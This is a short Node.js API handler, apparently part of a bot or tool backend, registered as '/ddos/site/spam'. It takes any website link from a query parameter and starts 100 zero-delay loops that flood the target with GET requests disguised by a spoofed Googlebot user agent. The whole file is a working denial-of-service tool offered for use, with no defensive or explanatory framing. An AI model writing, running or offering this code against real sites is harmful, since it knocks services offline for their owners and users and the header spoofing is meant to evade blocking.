const axios = require('axios');
const rl = require('readline-sync');

exports.name = "/ddos/site/spam";
exports.index = async (req, res) => {
  const site = req.query.link;

  if (!site) {
    return res.json({ error: "missing link parameters" });
  }

  try {
    const D = await axios.get(site);
    if (!D) {
      console.log('OK! SITE DOWN');
      return res.json({ message: 'OK! SITE DOWN' });
    } else {
      console.log('INFO! STARTING');
      const ping = async () => {
        try {
          await axios.get(site, {
            headers: {
              'User-Agent': "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            },
          });
          console.log('OK! PING');
        } catch {
          console.error('ERROR PING');
        }
      };
      for (let i = 0; i < Math.min(5000, 100); i++) {
        setInterval(ping, 0);
      }
      return res.json({ message: 'INFO! STARTING PINGS' });
    }
  } catch {
    console.log('ERR! PING BECAUSE THE WEBSITE IS DOWN');
    return res.json({ message: 'ERR! PING BECAUSE THE WEBSITE IS DOWN' });
  }
};